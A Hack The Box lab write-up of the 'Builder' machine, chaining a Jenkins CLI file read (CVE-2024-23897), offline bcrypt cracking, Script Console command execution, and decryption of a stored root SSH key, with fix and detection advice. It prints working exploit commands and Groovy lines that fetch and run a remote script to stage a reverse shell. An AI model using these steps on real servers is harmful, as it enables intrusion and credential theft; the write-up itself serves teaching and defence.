---
title: "Builder — Unauthenticated Jenkins CLI File Read to Root Credential Recovery"
description: "Unauthenticated Jenkins CLI file read (CVE-2024-23897) exposes a bcrypt password hash whose offline recovery unlocks the Script Console, and the credential store then reveals a path to root."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - linux
  - jenkins
  - ci-cd
  - credential-management
objective: "Escalate from unauthenticated Jenkins CLI file disclosure to root access through a recovered password hash and stored deployment credentials."
tools:
  - nmap
  - jenkins-cli
  - hashcat
  - ssh
skill: "Jenkins attack-surface analysis from unauthenticated file disclosure to credential-store abuse"
outcome: "Root SSH access using a private key decrypted from the Jenkins credential store, after Script Console code execution"
---

## At a glance

| Field | Value |
|---|---|
| Difficulty | Medium |
| Target environment | Linux (Ubuntu) host running a Jenkins 2.441 CI/CD server |
| Starting position | Unauthenticated network access |
| Objective | Escalate from unauthenticated Jenkins CLI file disclosure to root access through a recovered password hash and stored deployment credentials |
| Outcome | Code execution as the `jenkins` service account and root SSH access via a credential-store private key |

## CLI file read to credential-store root

Builder is a Medium-rated Hack The Box Linux lab centred on a Jenkins CI/CD server affected by CVE-2024-23897. An unauthenticated file read in the Jenkins CLI exposes the user index and a per-user configuration file and yields a bcrypt password hash; offline recovery enables authentication, the Groovy Script Console then provides operating-system command execution as the Jenkins service account, and a root SSH private key held in the Jenkins credential store is decrypted through Jenkins' own secret API. Target identifiers, credentials, and secret values are replaced with role-based placeholders; command syntax is preserved. See [how evidence is handled](/method/). The private key and payload specifics are omitted.

**Attack path:** **Unauthenticated Jenkins CLI `@` file read (CVE-2024-23897) → users index → per-user `config.xml` → bcrypt password hash → offline recovery → Jenkins authentication → Script Console execution as `jenkins` → `credentials.xml` root SSH key → `hudson.util.Secret` decryption → root SSH access**

## Target, CI/CD server, and objective

- **Target:** an Ubuntu Linux host exposing SSH and a Jenkins CI/CD server over HTTP.
- **Recorded services:** OpenSSH 8.9p1 on port 22 and Jetty 10.0.18 serving the Jenkins dashboard on port 8080.
- **Jenkins version:** 2.441, confirmed from the HTTP response headers and the `/login` page.
- **Starting position:** unauthenticated network access, with no provided credentials.
- **Objective:** assess the impact of unauthenticated Jenkins CLI file disclosure, the administrative Script Console, and the credentials held in the Jenkins store.
- **Constraints:** activity was confined to the Hack The Box lab environment.

## Evidence: file read to credential-store decryption

### 1. Service Enumeration

Observation: a full TCP scan exposes SSH and a Jenkins dashboard whose title and versions identify the CI/CD server.

```bash
nmap -sC -sV -p- --min-rate 5000 -oA <SCAN_OUTPUT> <TARGET_IP>
```

Truncated scan output:

```text
22/tcp   open  ssh   OpenSSH 8.9p1 Ubuntu 3ubuntu0.6
8080/tcp open  http  Jetty 10.0.18
|_http-title: Dashboard [Jenkins]
```

Significance: the dashboard title identifies a Jenkins instance, and the running version determines which Jenkins CLI behaviours apply to it.

Result: I checked the HTTP response headers and the login page, which identify Jenkins 2.441 alongside OpenSSH on the host.

### 2. Unauthenticated Jenkins CLI File Read (CVE-2024-23897)

Observation: Jenkins 2.441 and earlier process CLI arguments beginning with `@` as file paths before command handling, and the `help` command runs without authentication, so parse errors can disclose files readable by the Jenkins process.

```bash
java -jar <JENKINS_CLI_JAR> -s http://<TARGET_IP>:8080 help "@/var/jenkins_home/users/users.xml" 2>&1
```

Truncated output:

```text
<string><JENKINS_USER_DIR></string>
```

I then requested that user's configuration file using the directory identifier:

```bash
java -jar <JENKINS_CLI_JAR> -s http://<TARGET_IP>:8080 help "@/var/jenkins_home/users/<JENKINS_USER_DIR>/config.xml" 2>&1
```

```text
<passwordHash><BCRYPT_PASSWORD_HASH></passwordHash>
```

Significance: an unauthenticated CLI request reads arbitrary files the Jenkins process can access; the users index supplies the path component of the per-user configuration, which stores the account's password hash.

Result: the user index and a per-user `config.xml` are read, and a bcrypt password hash is recovered.

### 3. Offline Password Recovery

Observation: the recovered value is a bcrypt hash, so it must be cracked offline before it can be used.

```bash
hashcat -m 3200 <HASH_FILE> <WORDLIST>
```

```text
<BCRYPT_PASSWORD_HASH>:<RECOVERED_PASSWORD>
```

Significance: bcrypt (`$2a$10$`) is a deliberately slow hash, and the account password was weak enough to fall to a dictionary attack; the recovered value is the credential that authenticates to Jenkins.

Result: the account password is recovered offline.

### 4. Jenkins Authentication and Script Console Execution

Observation: the Groovy Script Console executes arbitrary code with the permissions of the Jenkins process. The source records that the recovered password authenticated successfully; it retained no separate login transcript.

```groovy
println "id".execute().text
```

```text
uid=1000(jenkins) gid=1000(jenkins)
```

The console also staged a reverse shell, preserved here only as placeholder patterns:

```groovy
println "curl -o <LOCAL_STAGING_PATH> <REMOTE_URL>".execute().text
println "bash <LOCAL_STAGING_PATH>".execute().text
```

Significance: the Script Console runs inside the Jenkins JVM, so its output reflects the service account's operating-system identity; the same channel can stage an interactive shell under that identity.

Result: the `id` output establishes operating-system command execution as the `jenkins` service account.

### 5. Credential-Store Privilege Escalation

Observation: the Jenkins home directory contains `credentials.xml` with an encrypted SSH private key configured for the root user.

```bash
cat /var/jenkins_home/credentials.xml
```

```text
<username>root</username>
<privateKeySource ...><privateKey><ENCRYPTED_JENKINS_SECRET></privateKey></privateKeySource>
```

Jenkins' `hudson.util.Secret` API decrypts values protected by its own credential encryption, and the Script Console can call it:

```groovy
println(hudson.util.Secret.decrypt("<ENCRYPTED_JENKINS_SECRET>"))
```

```text
-----BEGIN RSA PRIVATE KEY-----
[key material omitted]
-----END RSA PRIVATE KEY-----
```

The recovered key authenticates directly as root:

```bash
ssh root@<TARGET_IP> -i <RECOVERED_ROOT_KEY>
```

```text
root@<TARGET_HOST>:~#
```

Significance: the entry is scoped to the root account, so decrypting it converts a stored deployment secret into a privileged key, and the same Jenkins process that protects the secret is the process able to unwrap it.

Result: a root SSH private key is decrypted and used to obtain a root shell on the host.

## Two decisions: users index, then secret decryption

| Challenge | Decision | Rationale |
|---|---|---|
| The per-user configuration path is not known up front | Read `/var/jenkins_home/users/users.xml` first, then request that directory's `config.xml` | The `@` argument reads a fixed path, so the users index supplies the per-user directory component |
| Jenkins encrypts the stored SSH key with its own mechanism | Decrypt with `hudson.util.Secret` from the Script Console | The application's credential encryption protects the value, so its API unwraps it directly |

## Outcome: service shell and root from stored key

The documented path includes unauthenticated file read through the Jenkins CLI, authenticated code execution as the `jenkins` service account, and root access obtained with a private key decrypted from the Jenkins credential store. The material weakness is the combination of an unauthenticated disclosure primitive, an administrative console, and a credential store that holds a root key; CVE-2024-23897 is the only software vulnerability in the path.

Limitations: the credential material is not reproducible from this writeup, and I could not verify the login independently.

## Recommendations: CLI read, Script Console, and stored key

Each finding pairs the observed root cause with its demonstrated impact and a prioritized action. The actions are recommendations; none was validated in the lab.

1. **Unauthenticated Jenkins CLI file read (CVE-2024-23897).** Jenkins 2.441 exposed the `@` argument file read to unauthenticated requests, disclosing files readable by the service. *Recommendation:* upgrade to a release that addresses CVE-2024-23897 (fixed in 2.442) and disable the CLI when it is not required (`jenkins.CLI.disabled=true`). *Detection:* flag unauthenticated CLI requests that reach argument parsing.
2. **Script Console as unrestricted code execution.** The Groovy Script Console executed arbitrary code with the Jenkins process permissions. *Recommendation:* restrict Script Console access to a dedicated administrator identity, audit executions, and alert on use outside approved maintenance windows.
3. **Privileged credentials in the CI/CD credential store.** `credentials.xml` held a root SSH private key that Jenkins' own API could decrypt. *Recommendation:* keep privileged infrastructure keys out of CI/CD stores and use narrowly scoped, time-limited deployment identities instead. *Detection:* monitor credential-store access and unexpected root SSH authentication.

## References

- [Hack The Box — Builder](https://app.hackthebox.com/machines/Builder) (retired machine)
- [NVD — CVE-2024-23897](https://nvd.nist.gov/vuln/detail/CVE-2024-23897) (Jenkins CLI arbitrary file read)
- [Jenkins Security Advisory 2024-01-24](https://www.jenkins.io/security/advisory/2024-01-24/) (vendor advisory for CVE-2024-23897; fixed in 2.442)
- [Jenkins CLI](https://www.jenkins.io/doc/book/managing/cli/) (official command-line interface documentation)
- [Jenkins Script Console](https://www.jenkins.io/doc/book/managing/script-console/) (Groovy script execution interface)
- [Jenkins — Secret storage (`hudson.util.Secret`)](https://www.jenkins.io/doc/developer/security/secrets/) (credential and secret encryption API)
- [Hashcat](https://hashcat.net/hashcat/) (offline password recovery)
- [Nmap Reference Guide](https://nmap.org/book/man.html)
